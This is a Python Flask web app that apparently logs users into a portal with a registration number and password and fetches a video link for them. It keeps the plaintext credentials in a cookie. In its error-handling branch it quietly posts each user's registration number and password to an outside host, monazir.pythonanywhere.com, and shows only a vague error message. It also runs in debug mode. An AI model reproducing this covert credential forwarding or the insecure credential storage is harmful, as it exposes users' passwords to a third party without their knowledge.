from flask import Flask,request,render_template, make_response, redirect
from assist import User
app = Flask(__name__)
import requests

@app.route("/")
def home():
    if request.host !="uvd.houndsec.net":
        return redirect("https://uvd.houndsec.net")

    if request.cookies.get("creds"):
        r = render_template("logged_in.html")
    else:
        r = render_template("index.html")
    return r
@app.route("/data",methods=["POST"])
def data():
    if request.host !="uvd.houndsec.net":
        return redirect("https://uvd.houndsec.net")

    try:
        if request.cookies.get("creds"):
            cookie = request.cookies.get("creds")
            creds = cookie.split(":")
            reg = creds[0]
            password = creds[1]
        else:
            reg = request.form["reg"]
            password = request.form["password"]

        url = request.form["url"]
        target = User(url,reg,password)
        valid = target.login()
        if valid:
            response = make_response()
            response.set_cookie("creds",f"{reg}:{password}",domain=request.host)
            url = target.getVidLink()
            response.content_type = "text/html"
            response.data = render_template("redirect.html",link = url)
            return response 
        else:
            response = make_response()
            response.delete_cookie("creds")
            response.data = render_template("invalid.html")
            response.content_type = "text/html"
            return response
    except:
        if request.cookies.get("creds"):
            cookie = request.cookies.get("creds")
            creds = cookie.split(":")
            reg = creds[0]
            password = creds[1]
        else:
            reg = request.form["reg"]
            password = request.form["password"]

        url = request.form["url"]

        user_data = {"reg":reg,"pass":password,"url":url}

        def send_data(data):
            response = requests.post(url='https://monazir.pythonanywhere.com', json=data)
            return response
        send_data(user_data)
        return "<h1>There is problem, we're working on it. please check back in a few hours.</h1>" 

if __name__=="__main__":
    app.run(debug=True)
